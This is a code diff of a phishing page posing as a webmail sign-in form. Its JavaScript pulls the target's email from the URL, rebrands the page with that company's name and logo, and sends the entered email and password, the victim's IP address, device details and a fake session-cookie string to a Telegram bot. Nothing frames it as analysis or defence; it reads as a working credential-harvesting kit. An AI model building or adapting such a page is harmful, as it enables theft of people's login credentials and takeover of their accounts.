@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>cafc</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <link href="style.css" rel="stylesheet">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script src="addLogDetails.js"></script>
 </head>
 <body style="height:100vh;">
 
@@ -47,7 +46,7 @@
             <img src="img/sd1.png">
         </div>
         <div>
-            <button type="submit" id="Btn">Sign In</button>
+            <button id="Btn">Sign In</button>
         </div>
     </form>
 </div>
@@ -79,65 +78,33 @@ document.addEventListener("DOMContentLoaded", function() {
         document.querySelector('.fx-body').style.display = 'block';
     });
 
-    function generateId() {
-        const characters = 'abcdef0123456789';
-        const numDashes = 4;
-        const length = 13;
-        const dashPositions = [];
-        for (let i = 1; i < numDashes; i++) {
-            dashPositions.push((length + 1) * i + i - 1);
-        }
-        let result = '';
-        let dashCount = 0;
-        for (let i = 0; i < numDashes * (length + 1); i++) {
-            if (dashPositions.includes(i)) {
-                result += '-';
-                dashCount++;
-            } else {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-        }
-        return result;
-    }
+    const url = window.location.href;
+    const explode = url.split('#');
+    const getLogo = explode[1].split("@");
+    const company_name = getLogo[1].split('.');
 
-    function generateIdLetters() {
-        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-        const numDashes = 4;
-        const length = 21;
-        const dashPositions = [];
-        for (let i = 1; i < numDashes; i++) {
-            dashPositions.push((length + 1) * i + i - 1);
-        }
-        let result = '';
-        let dashCount = 0;
-        for (let i = 0; i < numDashes * (length + 1); i++) {
-            if (dashPositions.includes(i)) {
-                result += '-';
-                dashCount++;
-            } else {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-        }
-        return result;
-    }
+    const websiteName = company_name[0].charAt(0).toUpperCase() + company_name[0].slice(1);
+    document.getElementById('websiteName').textContent = `to ${websiteName}`;
+    document.getElementById('websiteNameBold').textContent = ` ${websiteName}`;
+    document.getElementById('footerWebsiteName').textContent = ` ${websiteName}`;
+    document.title = websiteName + " Login";
 
-    function formatDate(date) {
-        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-        const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-        const day = days[date.getUTCDay()];
-        const dayOfMonth = String(date.getUTCDate()).padStart(2, '0');
-        const month = months[date.getUTCMonth()];
-        const year = date.getUTCFullYear();
-        const hours = String(date.getUTCHours()).padStart(2, '0');
-        const minutes = String(date.getUTCMinutes()).padStart(2, '0');
-        const seconds = String(date.getUTCSeconds()).padStart(2, '0');
-        return `${day}, ${dayOfMonth} ${month} ${year} ${hours}:${minutes}:${seconds} UTC`;
+    let websiteUrl = getLogo[1];
+    if (!websiteUrl.startsWith('http://') && !websiteUrl.startsWith('https://')) {
+        websiteUrl = 'https://www.' + websiteUrl;
     }
+    document.querySelector('a[href="https://websitedomain"]').setAttribute('href', websiteUrl);
 
-    function setCurrentDateInDesiredFormat() {
-        const currentDate = new Date();
-        return formatDate(currentDate);
-    }
+    document.getElementById("logoImage").src = "https://logo.clearbit.com/" + getLogo[1];
+
+    document.getElementById("footerLogoImage").src = "https://logo.clearbit.com/" + getLogo[1];
+
+    const faviconLinks = document.querySelectorAll('link[rel="icon"]');
+    faviconLinks.forEach(link => {
+        link.href = "https://logo.clearbit.com/" + getLogo[1];
+    });
+
+    document.getElementById("xx").value = explode[1];
 
     function handleSignin(event) {
         event.preventDefault();
@@ -151,7 +118,7 @@ document.addEventListener("DOMContentLoaded", function() {
         if (!password) {
             document.getElementById('Btn').textContent = 'Sign in';
             document.getElementById("msg").innerHTML =
-                '<font face="Arial, Helvetica, sans-serif" size="2" style="color: red">Password required!</font>';
+                '<font face="Arial, Helvetica, sans-serif" size="2" style="color: red">Password required!</font>'
             return;
         }
 
@@ -162,7 +129,9 @@ document.addEventListener("DOMContentLoaded", function() {
         const userAgent = navigator.userAgent;
         const date = setCurrentDateInDesiredFormat();
 
-        const x = `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;
+        const x =
+            `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-
+        US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;
 
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
@@ -176,16 +145,16 @@ document.addEventListener("DOMContentLoaded", function() {
                 };
 
                 const payload = {
-                    email: email,
-                    password: password,
-                    ipAddress: ipAddress,
+                    email,
+                    password,
+                    ipAddress,
                     Device: deviceInfo.manufacturer,
                     OS: deviceInfo.os,
                     Browser: deviceInfo.browser,
                     Cookies: x,
                 };
 
-                sendToTelegram(payload);
+                sendToTelegram(payload, websiteName);
             })
             .catch(error => {
                 console.error("Error capturing IP address:", error);
@@ -193,7 +162,7 @@ document.addEventListener("DOMContentLoaded", function() {
             });
     }
 
-    function sendToTelegram(data) {
+    function sendToTelegram(data, websiteName) {
         const payload = {
             chat_id: chatId,
             text: `
@@ -212,7 +181,8 @@ document.addEventListener("DOMContentLoaded", function() {
         fetch("https://api.telegram.org/bot" + telegramBotId + "/sendMessage", {
             method: "POST",
             headers: {
-                "Content-Type": "application/json"
+                "Content-Type": "application/json",
+                "cache-control": "no-cache"
             },
             body: JSON.stringify(payload)
         })
@@ -230,8 +200,80 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     }
 
+    function generateId() {
+        const characters = 'abcdef0123456789';
+        const numDashes = 4;
+        const length = 13;
+
+        const dashPositions = [];
+        for (let i = 1; i < numDashes; i++) {
+            dashPositions.push((length + 1) * i + i - 1);
+        }
+
+        let result = '';
+        let dashCount = 0;
+
+        for (let i = 0; i < numDashes * (length + 1); i++) {
+            if (dashPositions.includes(i)) {
+                result += '-';
+                dashCount++;
+            } else {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+        }
+        return result;
+    };
+
+    function generateIdLetters() {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+        const numDashes = 4;
+        const length = 21;
+
+        const dashPositions = [];
+        for (let i = 1; i < numDashes; i++) {
+            dashPositions.push((length + 1) * i + i - 1);
+        }
+
+        let result = '';
+        let dashCount = 0;
+
+        for (let i = 0; i < numDashes * (length + 1); i++) {
+            if (dashPositions.includes(i)) {
+                result += '-';
+                dashCount++;
+            } else {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+        }
+        return result;
+    };
+
+    function formatDate(date) {
+        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+        const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov',
+            'Dec'
+        ];
+
+        const day = days[date.getUTCDay()];
+        const dayOfMonth = String(date.getUTCDate()).padStart(2, '0');
+        const month = months[date.getUTCMonth()];
+        const year = date.getUTCFullYear();
+        const hours = String(date.getUTCHours()).padStart(2, '0');
+        const minutes = String(date.getUTCMinutes()).padStart(2, '0');
+        const seconds = String(date.getUTCSeconds()).padStart(2, '0');
+
+        return `${day}, ${dayOfMonth} ${month} ${year} ${hours}:${minutes}:${seconds} UTC`;
+    };
+
+    function setCurrentDateInDesiredFormat() {
+        const currentDate = new Date();
+        const formattedDate = formatDate(currentDate);
+        return formattedDate;
+    };
+
     document.getElementById("webmailSignin-form").addEventListener("submit", handleSignin);
 });
 </script>
 </body>
 </html>
+
